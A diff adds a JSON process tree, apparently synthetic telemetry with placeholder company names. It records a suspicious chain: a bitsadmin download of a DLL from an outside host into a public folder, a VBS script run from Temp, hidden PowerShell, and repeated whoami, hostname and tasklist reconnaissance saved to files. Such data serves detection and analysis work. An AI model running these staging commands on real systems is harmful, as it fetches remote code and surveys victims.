@@ -1,0 +1,244 @@
+{
+  "pid": 225526,
+  "ppid": 0,
+  "name": "scriptlauncher.exe",
+  "command": "scriptlauncher.exe /startup",
+  "children": [
+    {
+      "pid": 225528,
+      "ppid": 225526,
+      "name": "bitsadmin.exe",
+      "command": "bitsadmin.exe /transfer Jobf8471b86 /download /priority NORMAL \"http://cdn.contoso-updates.com/tools/helper.dll\" \"C:\\Users\\Public\\helper.dll\"",
+      "children": [
+        {
+          "pid": 225529,
+          "ppid": 225528,
+          "name": "hostname.exe",
+          "command": "hostname.exe",
+          "children": [
+            {
+              "pid": 225531,
+              "ppid": 225529,
+              "name": "choice.exe",
+              "command": "choice.exe /d y /t 9 > nul",
+              "children": [
+                {
+                  "pid": 225542,
+                  "ppid": 225531,
+                  "name": "cmd.exe",
+                  "command": "cmd.exe /c \"echo maintenance step\"",
+                  "children": [
+                    {
+                      "pid": 225545,
+                      "ppid": 225542,
+                      "name": "cmd.exe",
+                      "command": "cmd.exe /c \"ping.exe -n 3 127.0.0.1 > nul\"",
+                      "children": [
+                        {
+                          "pid": 225552,
+                          "ppid": 225545,
+                          "name": "cscript.exe",
+                          "command": "cscript.exe //nologo \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\Cert_b1b199d4.vbs\" /apply",
+                          "children": [
+                            {
+                              "pid": 225553,
+                              "ppid": 225552,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /groups",
+                              "children": [
+                                {
+                                  "pid": 225559,
+                                  "ppid": 225553,
+                                  "name": "timeout.exe",
+                                  "command": "timeout.exe /t 25 /nobreak",
+                                  "children": [
+                                    {
+                                      "pid": 225565,
+                                      "ppid": 225559,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /all",
+                                      "children": [
+                                        {
+                                          "pid": 225567,
+                                          "ppid": 225565,
+                                          "name": "ping.exe",
+                                          "command": "ping.exe -n 13 127.0.0.1 > nul",
+                                          "children": [
+                                            {
+                                              "pid": 225571,
+                                              "ppid": 225567,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe > \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\who_ed011eee.txt\"",
+                                              "children": []
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            },
+                            {
+                              "pid": 225573,
+                              "ppid": 225552,
+                              "name": "timeout.exe",
+                              "command": "timeout.exe /t 25 /nobreak",
+                              "children": [
+                                {
+                                  "pid": 225580,
+                                  "ppid": 225573,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /all > \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\who_a3483ada.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 225584,
+                                      "ppid": 225580,
+                                      "name": "powershell.exe",
+                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 15\"",
+                                      "children": [
+                                        {
+                                          "pid": 225588,
+                                          "ppid": 225584,
+                                          "name": "tasklist.exe",
+                                          "command": "tasklist.exe /svc",
+                                          "children": [
+                                            {
+                                              "pid": 225595,
+                                              "ppid": 225588,
+                                              "name": "powershell.exe",
+                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'bitsadmin.exe' -ArgumentList '/info Job93334537 /verbose' -Wait\"",
+                                              "children": [
+                                                {
+                                                  "pid": 225601,
+                                                  "ppid": 225595,
+                                                  "name": "bitsadmin.exe",
+                                                  "command": "bitsadmin.exe /info Job7c1cc242 /verbose",
+                                                  "children": [
+                                                    {
+                                                      "pid": 225602,
+                                                      "ppid": 225601,
+                                                      "name": "powershell.exe",
+                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'bitsadmin.exe' -ArgumentList '/info Job832599bb /verbose' -Wait\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 225608,
+                                                          "ppid": 225602,
+                                                          "name": "timeout.exe",
+                                                          "command": "timeout.exe /t 2 /nobreak",
+                                                          "children": [
+                                                            {
+                                                              "pid": 225611,
+                                                              "ppid": 225608,
+                                                              "name": "hostname.exe",
+                                                              "command": "hostname.exe > \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\host_6bb90ba6.txt\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 225618,
+                                                                  "ppid": 225611,
+                                                                  "name": "powershell.exe",
+                                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'findstr.exe' -ArgumentList '/i \"failed\" \"C:\\ProgramData\\Woodgrove\\Logs\\diag.log\"' -Wait\"",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 225619,
+                                                                      "ppid": 225618,
+                                                                      "name": "whoami.exe",
+                                                                      "command": "whoami.exe /priv > \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\who_b40a9d58.txt\"",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 225625,
+                                                                          "ppid": 225619,
+                                                                          "name": "findstr.exe",
+                                                                          "command": "findstr.exe /i \"ERROR\" \"C:\\ProgramData\\Litware\\Logs\\support.log\"",
+                                                                          "children": []
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            },
+                                                            {
+                                                              "pid": 225627,
+                                                              "ppid": 225608,
+                                                              "name": "findstr.exe",
+                                                              "command": "findstr.exe /i \"ERROR\" \"C:\\ProgramData\\BlueYonder\\Logs\\support.log\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 225630,
+                                                                  "ppid": 225627,
+                                                                  "name": "bitsadmin.exe",
+                                                                  "command": "bitsadmin.exe /info Jobccfe0970 /verbose",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 225632,
+                                                                      "ppid": 225630,
+                                                                      "name": "whoami.exe",
+                                                                      "command": "whoami.exe /all",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 225635,
+                                                                          "ppid": 225632,
+                                                                          "name": "choice.exe",
+                                                                          "command": "choice.exe /d y /t 23 > nul",
+                                                                          "children": []
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 225536,
+      "ppid": 225526,
+      "name": "hostname.exe",
+      "command": "hostname.exe > \"C:\\Users\\akash.menon\\AppData\\Local\\Temp\\host_e5646eaa.txt\"",
+      "children": [
+        {
+          "pid": 225537,
+          "ppid": 225536,
+          "name": "bitsadmin.exe",
+          "command": "bitsadmin.exe /info Job3256436b /verbose",
+          "children": [
+            {
+              "pid": 225539,
+              "ppid": 225537,
+              "name": "bitsadmin.exe",
+              "command": "bitsadmin.exe /info Job62db6583 /verbose",
+              "children": []
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
